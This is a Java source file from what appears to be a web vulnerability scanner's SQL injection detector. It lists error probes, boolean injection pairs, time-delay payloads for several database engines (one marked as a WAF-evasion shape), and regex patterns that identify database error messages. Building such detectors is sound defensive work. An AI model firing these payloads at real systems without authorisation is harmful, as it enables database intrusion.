package pro.lawcybug.scanner.detectors.sqli;

import java.util.List;
import java.util.regex.Pattern;

/** Centralized payload and DB-error-signature library for all SQLi detectors. */
final class SqlPayloads {

    private SqlPayloads() {
    }

    // Short, low-noise probes used to trigger a syntax error without
    // necessarily proving exploitability -- just confirms unsanitized
    // interpolation into a SQL statement.
    static final List<String> ERROR_PROBES = List.of(
            "'", "\"", "')", "\")", "';--", "\";--", "`", "‘", "’"
    );

    // Engine-tagged boolean pairs: [trueCondition, falseCondition].
    static final List<String[]> BOOLEAN_PAIRS = List.of(
            new String[]{" AND 1=1-- -", " AND 1=2-- -"},
            new String[]{"' AND '1'='1", "' AND '1'='2"},
            new String[]{"\" AND \"1\"=\"1", "\" AND \"1\"=\"2"},
            new String[]{" OR 1=1-- -", " OR 1=0-- -"},
            new String[]{")  AND (1=1", ")  AND (1=2"}
    );

    // Engine-tagged time-delay payloads. %d is substituted with the
    // configured delay (seconds).
    static String[] timeDelayPayloads(long delaySeconds) {
        return new String[]{
                "' AND SLEEP(" + delaySeconds + ")-- -",                       // MySQL/MariaDB
                "\" AND SLEEP(" + delaySeconds + ")-- -",
                "' OR SLEEP(" + delaySeconds + ")-- -",
                "1) AND SLEEP(" + delaySeconds + ")-- -",
                "'; WAITFOR DELAY '0:0:" + delaySeconds + "'--",               // MSSQL
                "1; WAITFOR DELAY '0:0:" + delaySeconds + "'--",
                "' AND pg_sleep(" + delaySeconds + ")-- -",                    // PostgreSQL
                "1) AND pg_sleep(" + delaySeconds + ")-- -",
                "' || pg_sleep(" + delaySeconds + ")-- -",
                "' AND dbms_pipe.receive_message(('a'),"+ delaySeconds +")-- -", // Oracle
                "' AND 1=DBMS_LOCK.SLEEP(" + delaySeconds + ")-- -",
                "' AND (SELECT 1 FROM (SELECT(SLEEP(" + delaySeconds + ")))a)-- -" // nested MySQL (WAF-evasion shape)
        };
    }

    // (pattern, database engine label)
    static final List<Object[]> ERROR_SIGNATURES = List.of(
            new Object[]{Pattern.compile("SQL syntax.*MySQL", Pattern.CASE_INSENSITIVE), "MySQL"},
            new Object[]{Pattern.compile("Warning.*\\Wmysqli?_", Pattern.CASE_INSENSITIVE), "MySQL"},
            new Object[]{Pattern.compile("valid MySQL result", Pattern.CASE_INSENSITIVE), "MySQL"},
            new Object[]{Pattern.compile("check the manual that corresponds to your (MariaDB|MySQL) server version", Pattern.CASE_INSENSITIVE), "MySQL/MariaDB"},
            new Object[]{Pattern.compile("PostgreSQL.*ERROR", Pattern.CASE_INSENSITIVE), "PostgreSQL"},
            new Object[]{Pattern.compile("Warning.*\\Wpg_", Pattern.CASE_INSENSITIVE), "PostgreSQL"},
            new Object[]{Pattern.compile("valid PostgreSQL result", Pattern.CASE_INSENSITIVE), "PostgreSQL"},
            new Object[]{Pattern.compile("Driver.*SQL[\\-\\_ ]*Server", Pattern.CASE_INSENSITIVE), "MSSQL"},
            new Object[]{Pattern.compile("OLE DB.*SQL Server", Pattern.CASE_INSENSITIVE), "MSSQL"},
            new Object[]{Pattern.compile("Unclosed quotation mark after the character string", Pattern.CASE_INSENSITIVE), "MSSQL"},
            new Object[]{Pattern.compile("Microsoft SQL Native Client error", Pattern.CASE_INSENSITIVE), "MSSQL"},
            new Object[]{Pattern.compile("ORA-[0-9]{4,5}", Pattern.CASE_INSENSITIVE), "Oracle"},
            new Object[]{Pattern.compile("Oracle error", Pattern.CASE_INSENSITIVE), "Oracle"},
            new Object[]{Pattern.compile("SQLite/JDBCDriver", Pattern.CASE_INSENSITIVE), "SQLite"},
            new Object[]{Pattern.compile("SQLite\\.Exception", Pattern.CASE_INSENSITIVE), "SQLite"},
            new Object[]{Pattern.compile("System\\.Data\\.SQLite\\.SQLiteException", Pattern.CASE_INSENSITIVE), "SQLite"},
            new Object[]{Pattern.compile("Unknown column '[^']+' in 'field list'", Pattern.CASE_INSENSITIVE), "MySQL"},
            new Object[]{Pattern.compile("com\\.mysql\\.jdbc\\.exceptions", Pattern.CASE_INSENSITIVE), "MySQL"},
            new Object[]{Pattern.compile("org\\.postgresql\\.util\\.PSQLException", Pattern.CASE_INSENSITIVE), "PostgreSQL"},
            new Object[]{Pattern.compile("System\\.Data\\.SqlClient\\.SqlException", Pattern.CASE_INSENSITIVE), "MSSQL"},
            new Object[]{Pattern.compile("Npgsql\\.", Pattern.CASE_INSENSITIVE), "PostgreSQL"}
    );
}
